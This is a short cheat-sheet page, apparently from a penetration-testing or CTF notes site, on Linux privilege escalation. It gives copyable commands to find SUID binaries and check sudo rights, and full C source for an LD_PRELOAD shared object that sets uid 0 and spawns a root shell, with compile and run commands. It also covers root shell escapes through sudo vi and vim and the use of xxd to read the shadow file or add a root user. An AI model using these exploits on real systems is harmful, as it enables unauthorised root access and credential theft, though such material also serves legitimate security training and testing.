---
layout: topics
page-title: SUID
files-suid: find / -perm -u=s -type f 2>/dev/null
commands: sudo -l
compile-command: gcc -fPIC -shared -o shell.so shell.c -nostartfiles
run-command: sudo LD_PRELOAD=/tmp/shell.so find
---

[Click on process, go to SUID section for command](https://gtfobins.github.io/){:target="_blank"}
{% include copy-code-blocks.html text='Print files that have SUID set: ' language='bash' code=page.files-suid %}
{% include copy-code-blocks.html text='List available commands for current user: ' language='bash' code=page.commands %}
If sudo -l displays: env_keep+=LD_PRELOAD --> Compile short c program that will start a shell and run using LD_PRELOAD the program that specified NOPASSWD.

Example program: 
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}
```
{% include copy-code-blocks.html text='Compile with: ' language='c' code=page.compile-command %}
{% include copy-code-blocks.html text='To become root, run program that can be run with NOPASSWD with: ' language='c' code=page.run-command %}

vi: 'sudo vi' then ':!sh'

vim: 'sudo vim' then ':!bash'

xxd: Allows to read files and write to files. Can be used to read shadow, to try to crack user pass or to add an entry to passwd file to create a new root user
